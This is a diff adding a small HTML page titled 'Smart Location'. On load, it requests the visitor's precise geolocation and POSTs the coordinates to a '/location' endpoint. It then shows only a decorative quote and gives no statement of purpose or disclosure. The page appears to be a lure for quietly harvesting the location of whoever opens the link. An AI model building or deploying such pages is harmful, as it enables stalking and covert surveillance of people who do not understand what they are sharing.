@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Smart Location</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 50px;
+        }
+        .status {
+            font-size: 20px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <h2>𝓤𝓶𝓮𝓼𝓱</h2>
+    <div class="status"></div>
+
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, locationError, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                });
+            } else {
+                document.querySelector(".status").textContent = "लोकेशन ब्राउज़र सपोर्ट नहीं करता";
+            }
+        };
+
+        function sendLocation(position) {
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
+
+            fetch('/location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).then(response => response.json())
+              .then(data => {
+                  document.querySelector(".status").textContent = "𝓢𝓽𝓻𝓸𝓷𝓰 𝓲𝓼 𝓱𝓮 𝔀𝓱𝓸 𝔀𝓲𝓹𝓮𝓼 𝓱𝓲𝓼 𝓸𝔀𝓷 𝓽𝓮𝓪𝓻𝓼";
+              });
+        }
+
+        function locationError(err) {
+            document.querySelector(".status").textContent =
+                " (" + err.message + ")";
+        }
+    </script>
+</body>
+</html>
